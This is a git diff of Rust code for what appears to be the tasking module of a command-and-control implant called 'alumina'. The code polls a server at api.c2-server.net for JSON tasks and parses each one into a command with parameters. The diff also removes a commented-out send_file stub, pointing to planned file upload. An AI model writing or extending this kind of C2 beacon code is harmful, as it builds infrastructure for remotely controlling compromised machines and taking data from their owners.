@@ -1,6 +1,7 @@
 extern crate reqwest;
 extern crate serde_json;
 
+use serde::{Deserialize, Serialize};
 use error_chain::error_chain;
 
 error_chain! {
@@ -10,28 +11,41 @@ error_chain! {
     }
 }
 
+#[derive(Serialize, Deserialize)]
+pub struct IntermediateTask {
+    pub command: String,
+    pub parameters: serde_json::Value,
+}
+
+pub struct Task {
+    pub command: String,
+    pub parameters: std::collections::HashMap<String, String>,
+}
+
 pub struct JsonComms {
     pub server: String,
 }
 
 impl JsonComms {
-    pub fn get_tasks(&self) -> Vec<String> {
+    pub fn get_tasks(&self) -> Vec<Task> {
         let body = self._get_task_request().unwrap();
-        let empty_result = vec![serde_json::json!([])];
-        let result = body.as_array().unwrap_or(&empty_result);
-        let mut task_list = Vec::<String>::new();
-        for elem in result {
-            let task:String = (*elem).to_string();
-            task_list.push(task);
+        println!("{}", body);
+        let intermediate_task_list:Vec<IntermediateTask> = serde_json::from_value(body).unwrap();
+
+        let mut task_list = Vec::<Task>::new();
+        for elem in intermediate_task_list {
+            let parameters: std::collections::HashMap<String, String> = serde_json::from_value(elem.parameters).unwrap();
+            let new_task = Task {
+                command: elem.command,
+                parameters: parameters
+            };
+            task_list.push(new_task);
         }
         return task_list;
     }
 
     pub fn _get_task_request(&self) -> Result<serde_json::Value> {
-        let body = serde_json::json!(reqwest::blocking::get("http://api.c2-server.net/alumina/get_tasks")?.text()?);
+        let body = reqwest::blocking::get("http://api.c2-server.net/alumina/get_tasks")?.json::<serde_json::Value>()?;
         Ok(body)
     }
-
-    // pub fn send_file(&self, file_name: String) {
-    // }
 }
